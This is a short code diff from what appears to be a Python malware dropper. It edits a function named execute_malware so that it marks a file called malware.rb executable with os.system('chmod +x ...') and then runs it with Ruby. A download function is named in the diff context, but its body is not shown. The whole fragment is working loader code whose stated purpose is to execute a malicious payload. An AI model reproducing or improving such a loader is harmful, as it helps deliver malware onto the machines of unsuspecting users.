@@ -22,8 +22,10 @@ def download(path , web):
 # Changes the current working directory to the specified path
 # Executes the "Malware.rb" file using subprocess.run()
 def execute_malware(path):
+    file_path = path + '/malware.rb'
     os.chdir(path)
-    subprocess.run(path + '/malware.rb', shell=True)
+    os.system('chmod +x {}'.format(file_path))
+    subprocess.run(["ruby", file_path])
 
 # Main function
 def main():
